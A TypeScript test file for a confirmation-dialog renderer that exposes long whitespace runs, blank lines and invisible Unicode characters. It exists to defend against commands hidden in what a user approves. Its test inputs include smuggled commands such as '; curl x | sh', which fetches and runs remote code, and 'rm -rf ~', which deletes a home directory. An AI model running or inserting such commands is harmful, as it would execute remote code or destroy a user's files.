/**
 * The whitespace rule a confirmation's detail is drawn with (`verbatim-detail.ts`), the table the native
 * app's implementation shares.
 */
import { describe, expect, it } from 'vitest'

import {
  countHiddenCharacters,
  emptyLinesMarker,
  markHiddenCharacters,
  markVerbatimDetail,
  withoutHiddenCharacters
} from './verbatim-detail'

describe('marking a verbatim detail', () => {
  const cases: { name: string; detail: string; text: string }[] = [
    { name: 'a single space stays a space', detail: 'git status', text: 'git status' },
    { name: '2 spaces', detail: 'a  b', text: 'a··b' },
    { name: '6 spaces', detail: 'a      b', text: 'a······b' },
    { name: '7 spaces', detail: 'a       b', text: 'a[␣×7]b' },
    { name: 'leading indentation', detail: '    keep', text: '····keep' },
    { name: 'long indentation', detail: `${' '.repeat(12)}keep`, text: '[␣×12]keep' },
    { name: 'a tab', detail: 'a\tb', text: 'a→b' },
    { name: 'two tabs', detail: '\t\tb', text: '→→b' },
    { name: 'a tab between space runs', detail: 'a  \t  b', text: 'a··→··b' },
    { name: 'a space and a tab', detail: 'a \tb', text: 'a →b' },
    { name: 'one blank line stays', detail: 'a\n\nb', text: 'a\n\nb' },
    { name: 'two blank lines stay', detail: 'a\n\n\nb', text: 'a\n\n\nb' },
    { name: 'three blank lines are one marker', detail: 'a\n\n\n\nb', text: `a\n${emptyLinesMarker(3)}\nb` },
    { name: 'whitespace-only lines are blank', detail: 'a\n  \n\t\n \nb', text: `a\n${emptyLinesMarker(3)}\nb` },
    { name: 'a short run of whitespace-only lines is drawn empty', detail: 'a\n    \nb', text: 'a\n\nb' },
    { name: 'blank lines at the start', detail: '\n\n\n\nb', text: `${emptyLinesMarker(4)}\nb` },
    { name: 'a trailing line break', detail: 'a\n', text: 'a\n' },
    { name: 'CRLF is a line break', detail: 'a  b\r\nc\r\n\r\n\r\n\r\nd', text: `a··b\nc\n${emptyLinesMarker(3)}\nd` },
    { name: 'nothing', detail: '', text: '' }
  ]

  for (const { name, detail, text } of cases) {
    it(name, () => {
      expect(markVerbatimDetail(detail).text).toBe(text)
    })
  }

  it('draws the 300-space attack with both commands in view', () => {
    const marked = markVerbatimDetail(`git status${' '.repeat(300)}; curl x | sh`)

    expect(marked.text).toBe('git status[␣×300]; curl x | sh')
    // Measured on the verbatim text: one line of 10 + 300 + 13 code points.
    expect(marked).toMatchObject({ lines: 1, longestLine: 323 })
  })

  it('draws 80 blank lines as one marker line', () => {
    const marked = markVerbatimDetail(`echo ok${'\n'.repeat(81)}rm -rf ~`)

    expect(marked.text).toBe('echo ok\n⋯ 80 empty lines ⋯\nrm -rf ~')
    expect(marked).toMatchObject({ lines: 82, longestLine: 8 })
  })

  // The same table as the native app's `ConfirmDetailMarkupTests`.
  const hidden: { name: string; detail: string; text: string }[] = [
    { name: 'a zero-width space', detail: 'rm​-rf', text: 'rm[U+200B]-rf' },
    { name: 'direction overrides', detail: 'echo ‮hs.x‬', text: 'echo [U+202E]hs.x[U+202C]' },
    { name: 'a byte order mark', detail: '﻿ls', text: '[U+FEFF]ls' },
    { name: 'direction isolates', detail: 'a⁦⁩b', text: 'a[U+2066][U+2069]b' },
    { name: 'an escape character', detail: 'a\u001B[2Kb', text: 'a[U+001B][2Kb' },
    { name: 'blank letters', detail: 'aㅤb⠀c', text: 'a[U+3164]b[U+2800]c' },
    { name: 'a lone carriage return', detail: 'a\rb', text: 'a[U+000D]b' },
    {
      name: 'line breaks that are not \\n',
      detail: 'a\u000B\u000C\u0085 b',
      text: 'a[U+000B][U+000C][U+0085][U+2029]b'
    },
    { name: 'a line of only ideographic spaces', detail: 'a\n　　\n\n\nb', text: 'a\n[U+3000×2]\n\n\nb' },
    // Default-ignorable code points that are not format characters: they draw nothing at all.
    { name: 'a combining grapheme joiner', detail: 'a\u034Fb', text: 'a[U+034F]b' },
    { name: 'a variation selector', detail: 'a\uFE0Fb', text: 'a[U+FE0F]b' },
    { name: 'a Mongolian free variation selector', detail: 'a\u180Bb', text: 'a[U+180B]b' },
    { name: 'a Khmer inherent vowel', detail: 'a\u17B4b', text: 'a[U+17B4]b' },
    { name: 'a variation selector of the supplement', detail: 'a\u{E0100}b', text: 'a[U+E0100]b' },
    { name: 'a tag character', detail: 'a\u{E0041}b', text: 'a[U+E0041]b' },
    { name: 'a musical null notehead', detail: 'a\u{1D159}b', text: 'a[U+1D159]b' },
    // Unassigned code points (and a noncharacter): nothing is drawn for them either.
    { name: 'an unassigned code point', detail: 'a\u0378b', text: 'a[U+0378]b' },
    { name: 'a run of unassigned code points', detail: 'a\u0378\u0378\u0378b', text: 'a[U+0378×3]b' },
    { name: 'an unassigned code point in a far plane', detail: 'a\u{50000}b', text: 'a[U+50000]b' },
    { name: 'a noncharacter', detail: 'a\uFFFFb', text: 'a[U+FFFF]b' },
    { name: 'a line of only default-ignorable code points', detail: 'a\n\u034F\n\n\nb', text: 'a\n[U+034F]\n\n\nb' },
    { name: 'letters, accents and emoji', detail: 'café ✓ 😀 não', text: 'café ✓ 😀 não' }
  ]

  for (const { name, detail, text } of hidden) {
    it(`shows ${name} by code point`, () => {
      expect(markVerbatimDetail(detail).text).toBe(text)
    })
  }

  it('draws 300 no-break spaces between two commands as one counted marker', () => {
    const marked = markVerbatimDetail(`git status${' '.repeat(300)}; curl x | sh`)

    expect(marked.text).toBe('git status[U+00A0×300]; curl x | sh')
    expect(marked).toMatchObject({ lines: 1, longestLine: 323 })
  })

  it('keeps 80 line separators on their line, so the second command stays in view', () => {
    const marked = markVerbatimDetail(`git status${' '.repeat(80)}curl x | sh`)

    expect(marked.text).toBe('git status[U+2028×80]curl x | sh')
    expect(marked.lines).toBe(1)
  })

  it('counts lines and the longest line on the verbatim text, in code points', () => {
    expect(markVerbatimDetail('ab\n🙂🙂🙂\n\n\n\n')).toMatchObject({ lines: 6, longestLine: 3 })
  })

  it('takes the words of the marker line from the sheet', () => {
    expect(markVerbatimDetail('a\n\n\n\nb', count => `⋯ ${count} lege regels ⋯`).text).toBe('a\n⋯ 3 lege regels ⋯\nb')
  })
})

describe('marking what a draft hides', () => {
  const rlo = String.fromCodePoint(0x202e)
  const zwsp = String.fromCodePoint(0x200b)
  const nbsp = String.fromCodePoint(0xa0)

  it('shows a character that draws nothing by its code point, and changes nothing else', () => {
    expect(markHiddenCharacters(`pay${rlo}evil`)).toBe('pay[U+202E]evil')
    expect(markHiddenCharacters(`a${zwsp}${zwsp}${zwsp}b`)).toBe('a[U+200B×3]b')
    expect(markHiddenCharacters(`a${nbsp}b`)).toBe('a[U+00A0]b')
    // Spaces, indentation and blank lines stay as they are: a draft reads as it is.
    expect(markHiddenCharacters('  indented\n\n\n\nend  ')).toBe('  indented\n\n\n\nend  ')
  })

  it('leaves a tab as a tab unless it is asked to count it', () => {
    expect(markHiddenCharacters('a\tb')).toBe('a\tb')
    expect(markHiddenCharacters('a\tb', { tabs: true })).toBe('a[U+0009]b')
    expect(countHiddenCharacters('a\tb')).toBe(0)
    expect(countHiddenCharacters('a\tb', { tabs: true })).toBe(1)
  })

  it('counts them, and removes them on request', () => {
    const text = `a${zwsp}b${rlo}c\td`

    expect(countHiddenCharacters(text)).toBe(2)
    expect(withoutHiddenCharacters(text)).toBe('abc\td')
    expect(withoutHiddenCharacters(text, { tabs: true })).toBe('abcd')
    expect(countHiddenCharacters('plain text\nwith lines')).toBe(0)
  })
})
